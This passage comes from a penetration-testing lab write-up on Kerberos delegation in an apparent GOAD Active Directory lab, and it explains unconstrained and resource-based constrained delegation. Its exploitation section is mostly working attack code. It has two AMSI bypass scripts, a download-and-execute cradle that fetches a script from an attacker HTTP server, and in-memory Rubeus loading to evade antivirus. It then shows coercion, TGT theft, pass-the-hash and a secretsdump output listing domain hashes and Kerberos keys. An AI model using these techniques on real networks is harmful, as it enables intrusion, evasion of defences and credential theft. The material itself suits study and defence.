```

### 6.7.4 Unconstrained Delegation

The server or the service account can authenticate on behalf of the user to any other service.

For this to happen there are two prerequisites:
- Account that wants to delegate an authentication has the **TRUSTED_FOR_DELEGATION** flag in his **UAC - User Account Control** flag.To set this flag, you need to have the **SeEnableDelegationPrivilege** right, which is usually only available for Domain Administrators.
- The user account which will be relayed is **relayable.** To disable relaying capabilities on an account, **NOT_DELEGATED** flag is set. By default, no account on the AD has this flag set are all "relayable." 

During exchanges with the Domain Controller, when the users asks for a TGS, he will specify the SPN of the service he wants to use. At this point the Domain Controller looks for the two prerequisites:
- Is the **TRUSTED_FOR_DELEGATION** flag set in the attributes of the account associated to the SPN.
- Is the **NOT_DELEGATION** flag not set for the requesting user.

If both of these are met, the Domain Controller will respond to the user with a TGS containing standard information, but also contains a copy of the user's TGT in his response, and a new associated session key.

### 6.7.5 Exploiting Unconstrained Delegation

First, get an RDP connection on Winterfell:

`xfreerdp /d:north.sevenkingdoms.local /u:eddard.stark /p:'FightP3aceAndHonor! /v:10.4.10.11 /cert-ignore`

In the Kali Machine prepare a folder with the `Rubeus.exe` and AMSI (Anti-malware Scan Interface) bypass.

In the folder, clone the following github repo for the Rubeus.exe, and keep only the Rubeus.exe file:

`https://github.com/r3motecontrol/Ghostpack-CompiledBinaries`

Prepare the ANSI bypass file, by creating a text document and pasting the following:

```txt
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

In the folder with the two files, start a python server:

`python3 -m http.server 8080`

Now, use the AMSI bypass in the rdp session:

`$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)`

`(new-object system.net.webclient).downloadstring('http://10.4.10.99:8080/amsi_rmouse.txt')|IEX`

![Pasted_image_20250113114737](https://github.com/user-attachments/assets/c98b7d72-c5a0-49c2-8227-35d7f7b3775f)

In order to avoid the possibility of being detected by antivirus or any endpoint detection tools, let's execute Rubeus from memory, instead of writing the executable file to disk.

And then see the available tickets:

`$data = (New-Object System.Net.WebClient).DownloadData('http://10.4.10.99:8080/Rubeus.exe')`

`$assem = [System.Reflection.Assembly]::Load($data);`

`[Rubeus.Program]::MainString("triage");`

![Pasted_image_20250113115134](https://github.com/user-attachments/assets/23e23918-8dd3-420b-9229-1865d19a2c5a)

Now force a coerce of the KingsLanding to the Winterfell:

`coercer coerce -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell`

Continue some steps of the process by pressing the `c`.
![Pasted_image_20250113115734](https://github.com/user-attachments/assets/3113906a-b28e-4145-8904-80b62205f5ff)

Look at the triage again:

`[Rubeus.Program]::MainString("triage")`

And we see the `krbtgt` service from Kingslanding:

![Pasted_image_20250113115953](https://github.com/user-attachments/assets/2222fe51-3361-441d-8b35-6b9d288b3348)

Now to extract the tgt, relaunch again the coercer, do the same steps, and run the dump command in Rubeus.

`[Rubeus.Program]::MainString("dump /user:kingslanding$ /service:krbtgt /nowrap");`

![Pasted_image_20250113120149](https://github.com/user-attachments/assets/037ac6fc-5dad-49ca-9cb0-0acc921b27fe)

Save this to a file, and export it to the Kali Machine.

I did this by connecting via `wmiexec.py`:

`wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 eddard.stark@10.4.10.11`

Going to the directory where the file was saved and using the `lget` to retrieve it.

Afterwards, open it with vim, and add this in order to delete the whitespaces:

`:%s/\s//g`

The ticket is base64 encoded, so decode it and save to a kirbi file

`cat tgt.txt|base64 > ticket.kirbi`

Convert it to `ccache` file by using the ticketconverter.py:

`ticketconverter.py ticket.kirbi ticket.ccache`

Export it:

`export KRB5CCNAME=/home/kali/Documents/delegations/Coercer/coercer/ticket.ccache`

We see that the ticket is in the `klist` now:

```bash
Ticket cache: FILE:/home/kali/Documents/delegations/Coercer/coercer/ticket.ccache
Default principal: KINGSLANDING$@SEVENKINGDOMS.LOCAL

Valid starting       Expires              Service principal
01/13/2025 14:13:48  01/14/2025 00:13:48  krbtgt/SEVENKINGDOMS.LOCAL@SEVENKINGDOMS.LOCAL
	renew until 01/17/2025 19:38:50
```

Try a secretsdump:

`secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$@KINGSLANDING`

And we got the secrets!

```bash
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5c3a2910c238cb5a530b8b5369a6cf1e:::
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
tywin.lannister:1113:aad3b435b51404eeaad3b435b51404ee:af52e9ec3471788111a6308abff2e9b7:::
jaime.lannister:1114:aad3b435b51404eeaad3b435b51404ee:12e3795b7dedb3bb741f2e2869616080:::
cersei.lannister:1115:aad3b435b51404eeaad3b435b51404ee:c247f62516b53893c7addcf8c349954b:::
tyron.lannister:1116:aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998:::
robert.baratheon:1117:aad3b435b51404eeaad3b435b51404ee:9029cf007326107eb1c519c84ea60dbe:::
joffrey.baratheon:1118:aad3b435b51404eeaad3b435b51404ee:3b60abbc25770511334b3829866b08f1:::
renly.baratheon:1119:aad3b435b51404eeaad3b435b51404ee:1e9ed4fc99088768eed631acfcd49bce:::
stannis.baratheon:1120:aad3b435b51404eeaad3b435b51404ee:d75b9fdf23c0d9a6549cff9ed6e489cd:::
petyer.baelish:1121:aad3b435b51404eeaad3b435b51404ee:6c439acfa121a821552568b086c8d210:::
lord.varys:1122:aad3b435b51404eeaad3b435b51404ee:52ff2a79823d81d6a3f4f8261d7acc59:::
maester.pycelle:1123:aad3b435b51404eeaad3b435b51404ee:9a2a96fa3ba6564e755e8d455c007952:::
KINGSLANDING$:1001:aad3b435b51404eeaad3b435b51404ee:266a819ccba54527708c65febab712ad:::
NORTH$:1104:aad3b435b51404eeaad3b435b51404ee:ac819f7c593d51f56b614f3dcc10f193:::
ESSOS$:1105:aad3b435b51404eeaad3b435b51404ee:52bac9dd1cab3cdb208d7347118690d9:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5ca87118dd89b088de54fb17b009eccadacf97c564e4112a8d0958f9c929165d
Administrator:aes128-cts-hmac-sha1-96:961cd2fe40742376597e986a969ef586
Administrator:des-cbc-md5:b392b0ba3e3e1925
krbtgt:aes256-cts-hmac-sha1-96:f353b3ba6b9bdbe7b0917a4a73b8250f1938c568798a5a3307bf717fe713a48f
krbtgt:aes128-cts-hmac-sha1-96:6f531a15aa3dbd348c5bfbafdfa68124
krbtgt:des-cbc-md5:1f1aad648c3479c8
localuser:aes256-cts-hmac-sha1-96:96286517ab35191f2184b009d2c1347ea40c2aa6696428df79bcc5b0f4e8514c
localuser:aes128-cts-hmac-sha1-96:531c3e0f768242e32d8ba911abe36fc5
localuser:des-cbc-md5:ab1cefe994f7b5a8
tywin.lannister:aes256-cts-hmac-sha1-96:6d700f4ade8a38d18bdd4f149aab963dfd0dce88a66240abdbdcb9044677fb80
tywin.lannister:aes128-cts-hmac-sha1-96:e813c0778e005572a1bef0c1a5337b76
tywin.lannister:des-cbc-md5:8f2594dada98862a
jaime.lannister:aes256-cts-hmac-sha1-96:1ed5f614b71e193bba93dc07e14c1c445a27ff1a6b0f265e98b45b10f6940ba7
jaime.lannister:aes128-cts-hmac-sha1-96:d7befe9d0dbb7a6d925156d5642ba57f
jaime.lannister:des-cbc-md5:ec51389dd6b67076
cersei.lannister:aes256-cts-hmac-sha1-96:0cbbc101644c0d73d9155b71172c811d41a3a640fea655b1fd6d6a22fd53ca59
cersei.lannister:aes128-cts-hmac-sha1-96:9c22476a9d1c88b472a7567a4380e502
cersei.lannister:des-cbc-md5:10c7a8a2b3643468
tyron.lannister:aes256-cts-hmac-sha1-96:ee2568536d09581b7b5e30b707e58d27e2cf5ee7acfc90dce4de852e44c5633c
tyron.lannister:aes128-cts-hmac-sha1-96:9b7f0a412e6219a1b48b8fb12ff2d499
tyron.lannister:des-cbc-md5:013d7091a470c719
robert.baratheon:aes256-cts-hmac-sha1-96:6b5468ea3a7f5cac5e2f580ba6ab975ce452833e9215fa002ea8405f88e5294d
robert.baratheon:aes128-cts-hmac-sha1-96:4f12248736038b239853bcf1d4abad94
robert.baratheon:des-cbc-md5:49762afd1f38abf1
joffrey.baratheon:aes256-cts-hmac-sha1-96:a008819500909ab61b76564b0d81cf4f7cb1bd7f213206e25df681f92792aa8c
joffrey.baratheon:aes128-cts-hmac-sha1-96:504c606625e04cd3b61107b8a29fdd4d
joffrey.baratheon:des-cbc-md5:fbc262e5efa1160e
renly.baratheon:aes256-cts-hmac-sha1-96:9a71ce0dcb412d20641d5075513644255f08b2a9767b5e79f487e5103cc55385
renly.baratheon:aes128-cts-hmac-sha1-96:ed5fe1af8432bcc33921aa1ac4d8c071
renly.baratheon:des-cbc-md5:519b98239223cb07
stannis.baratheon:aes256-cts-hmac-sha1-96:01c636e600ae2cfb05695b13ff1e906662941de94323233580f369f16e2b295a
stannis.baratheon:aes128-cts-hmac-sha1-96:c6224aebad6b49e083bc70d99f02f612
stannis.baratheon:des-cbc-md5:370d626ea886aefe
petyer.baelish:aes256-cts-hmac-sha1-96:6e0ef6e1793e4ac90dc1afa073ddfd46fc117308d0f0b4cae68dd370cf7439c3
petyer.baelish:aes128-cts-hmac-sha1-96:6fcbd3ff8b3111772644a8d0912ac744
petyer.baelish:des-cbc-md5:73a867cbe910a78a
lord.varys:aes256-cts-hmac-sha1-96:50ab31c625a3544d17d0dd20ae6f3d1c195c846faca9ce187073fd886d2d8206
lord.varys:aes128-cts-hmac-sha1-96:a4607553a99e2ff4fa1bcb98b0020661
lord.varys:des-cbc-md5:349173d05e6d9bc1
maester.pycelle:aes256-cts-hmac-sha1-96:25370ba431b262bdf7ca279e88d824cd59b4ce280bbef537a96fe51c8d790042
maester.pycelle:aes128-cts-hmac-sha1-96:7d375f265062643302a4827719ea541d
maester.pycelle:des-cbc-md5:89379167f87f0b5b
KINGSLANDING$:aes256-cts-hmac-sha1-96:31c26f3811b55f25733ba86d5ef8bb69fc7996f63da0a71f701f9cf8c84fb70e
KINGSLANDING$:aes128-cts-hmac-sha1-96:b3e762fa06f11c8a40f21c2584bd15cf
KINGSLANDING$:des-cbc-md5:cd85b03b15fe7061
NORTH$:aes256-cts-hmac-sha1-96:9ea07688172b2ae6735381e5d800db6848b546d5536cb143b4edaed345ffb134
NORTH$:aes128-cts-hmac-sha1-96:843a818914a31220de10a02783b4f20a
NORTH$:des-cbc-md5:da29856baef80edc
ESSOS$:aes256-cts-hmac-sha1-96:e4bb187a355df477fad9870225ffe8ce5a98fdbbc1250396a519a4da12e1d211
ESSOS$:aes128-cts-hmac-sha1-96:9d84f46f723aaec1ecd483482d6d5de0
ESSOS$:des-cbc-md5:2f52158916f43d4f
```
### 6.7.6 Resource Based Constrained Delegation

In this case, the DC will look at the attributes of **Resource B** instead of the Service. It will check that the account associated with the Service is present in the **mDS-AllowedToActOnBehalfOfOtherIdentity** attribute of the account liked to **Resource B.**

![Pasted_image_20250113093454](https://github.com/user-attachments/assets/e11662a5-db0c-422b-974d-0b538777f272)

So the difference is that in **Constrained Delegation** the relaying server holds the list of allowed target services, and in **Resource Based Constrained Delegation,** its the resources (or services) that have a list of accounts they trust for delegation.